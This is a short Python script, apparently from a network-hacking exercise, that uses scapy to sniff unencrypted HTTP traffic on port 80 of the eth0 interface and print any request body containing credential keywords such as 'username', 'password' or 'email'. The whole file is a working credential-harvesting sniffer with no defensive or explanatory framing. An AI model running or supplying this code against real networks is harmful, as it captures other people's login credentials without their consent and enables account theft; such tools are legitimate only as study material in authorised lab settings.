#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode()  # Convert bytes to string using decode()
            keywords = ["username", "user", "login", "password", "pass", "usr", "userID", "uname", "email", "userPassword", "pswd", "pass", "pwd"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

sniff("eth0")
